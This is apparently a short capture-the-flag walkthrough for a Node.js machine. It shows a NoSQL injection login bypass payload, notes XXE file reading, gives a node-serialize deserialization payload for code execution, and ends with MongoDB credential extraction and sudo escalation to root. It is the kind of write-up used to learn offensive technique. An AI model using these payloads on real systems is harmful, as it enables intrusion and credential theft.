Started with a nmap scan
```
22 OpenSSH 8.2p1
5000 Node.js
```
Going to the website all we have is a login forum if we switch the request to `json` format and then we can bypass the login page with this payload 
```
{
	"user": "admin",
	"password": {
	"$ne": "admin"
	}
}
```
and now we have access to the site and there is a upload forum that only takes xml files and we have xxe injection and we can read files now we can do a node serialize exploit in the cookie to get a reverse shell and we have to make sure we encode all key charters and have no `+` in are base64 
```
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',
function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```
now we have a shell as admin but we dont have access to are home folder so if we do `chmod +x /home/admin` we can now access it and we have mongo db running on port `27017` and we can access the database we can access the DB with `mongo` then do `show dbs` then `use blog` then `db.users.find()` and we got the creds for the admin user and when we do `sudo -l` we have access to root `sudo -u root su` and now were root 